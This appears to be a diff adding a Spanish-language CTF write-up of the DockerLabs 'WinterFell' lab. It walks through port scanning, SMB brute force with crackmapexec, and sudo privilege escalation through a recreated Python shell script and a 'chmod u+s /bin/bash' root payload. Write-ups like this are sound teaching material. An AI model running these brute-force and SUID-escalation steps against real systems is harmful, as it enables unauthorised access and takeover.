@@ -1,0 +1,269 @@
+---
+title: WinterFell
+description: Resolución completa de la máquina virtual *WinterFell* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **WinterFell**, desarrollada por *Zunderrub* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone múltiples servicios, incluyendo HTTP y SMB. En el servidor web se encuentra un diccionario de contraseñas, mientras que la enumeración SMB revela un usuario válido y un recurso compartido accesible. Mediante fuerza bruta con el diccionario obtenido, se accede al recurso SMB y se extrae un archivo con una contraseña codificada en Base64, permitiendo el acceso SSH al sistema como `jon`.
+Una vez dentro, se encadenan múltiples configuraciones inseguras de `sudo`: `jon` puede ejecutar y recrear un script Python como `aria`, `aria` puede leer archivos de `daenerys` mediante `cat`, y `daenerys` puede ejecutar un script modificable como root, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'WinterFell',
+    Autor: 'Zunderrub',
+    Dificultad: 'Fácil',
+    Fecha: '16/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip WinterFell.zip
+sudo bash auto_deploy.sh WinterFell.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p WinterFell/{content,exploits,nmap,scripts}
+cd WinterFell
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **139/tcp** — SMB
+* **445/tcp** — SMB
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762839916/Ports_zqctwr.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762839915/Gobuster_ojrgkr.png)
+
+**Rutas encontradas:**
+- `/index` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762839916/Index_zbjq7p.png)
+- `/dragon` — Contiene un archivo con una lista de palabras.
+  ![Dragon](https://res.cloudinary.com/dewqswzke/image/upload/v1762839915/EpisodiosT1_uq7rjq.png)
+
+---
+
+### 1.4 Enumeración SMB
+
+Con `enum4linux` se identifican usuarios y recursos compartidos:
+
+![Users SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1762839921/UsersSmb_hx405t.png)
+
+![Shares SMB](https://res.cloudinary.com/dewqswzke/image/upload/v1762839917/SharesSmb_swb8gu.png)
+
+Se detecta el usuario **jon** y el recurso compartido `shares`.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta SMB
+
+Con el usuario `jon` y el diccionario obtenido de `/dragon`, se realiza fuerza bruta con `crackmapexec`:
+
+```bash
+crackmapexec smb 172.17.0.2 -u jon -p passwords.txt
+```
+
+![Crackmapexec](https://res.cloudinary.com/dewqswzke/image/upload/v1762839915/Crackmapexec_oet49d.png)
+
+### 2.2 Acceso al recurso compartido
+
+Se accede al recurso `shares`:
+
+```bash
+smbclient //172.17.0.2/shares -U jon%PASSWORD
+```
+
+![SMB Content](https://res.cloudinary.com/dewqswzke/image/upload/v1762839918/SmbContent_lbqo8b.png)
+
+### 2.3 Extracción de credenciales
+
+El archivo `proteccion_del_reino` contiene una contraseña codificada en Base64:
+
+![Proteccion](https://res.cloudinary.com/dewqswzke/image/upload/v1762839916/ProteccionDelReino_krkylc.png)
+
+### 2.4 Acceso SSH
+
+Se decodifica la contraseña y se accede al sistema:
+
+```bash
+ssh jon@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1762839918/SSH_mjchut.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De jon → aria
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l jon](https://res.cloudinary.com/dewqswzke/image/upload/v1762839920/Sudo-lJon_rociix.png)
+
+Se puede ejecutar `.mensaje.py` como `aria`. El archivo no se puede modificar directamente, pero se puede eliminar y recrear:
+
+```python
+import os
+os.system('/bin/bash')
+```
+
+Se ejecuta:
+
+```bash
+sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
+```
+
+### 3.2 De aria → daenerys
+
+Se verifican los permisos sudo de `aria`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l aria](https://res.cloudinary.com/dewqswzke/image/upload/v1762839919/Sudo-lAria_dybkzl.png)
+
+Se puede ejecutar `cat` y `ls` como `daenerys`. Se lee un archivo en su home:
+
+![ParaJonAria](https://res.cloudinary.com/dewqswzke/image/upload/v1762839916/ParaJonAria_jr6shl.png)
+
+Se obtiene la contraseña de `daenerys`:
+
+```bash
+su daenerys
+```
+
+### 3.3 De daenerys → root
+
+Se verifican los permisos sudo de `daenerys`:
+
+```bash
+sudo -l
+```
+
+![Sudo -l daenerys](https://res.cloudinary.com/dewqswzke/image/upload/v1762839919/Sudo-lDaenerys_cjgzpc.png)
+
+Se puede ejecutar `.shell.sh` como root. El archivo es modificable:
+
+```bash
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+Se ejecuta:
+
+```bash
+sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
+```
+
+```bash
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762839916/Root_x6dmmr.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Diccionario de contraseñas expuesto en servidor web",
+      severity: "Media",
+      impact: "Facilita ataques de fuerza bruta"
+    },
+    {
+      vulnerability: "Contraseña codificada en Base64 en archivo SMB",
+      severity: "Alta",
+      impact: "Acceso SSH al sistema"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en script Python",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario aria"
+    },
+    {
+      vulnerability: "Permisos sudo en cat para leer archivos de daenerys",
+      severity: "Alta",
+      impact: "Movimiento lateral al usuario daenerys"
+    },
+    {
+      vulnerability: "Script ejecutado por root y modificable por daenerys",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
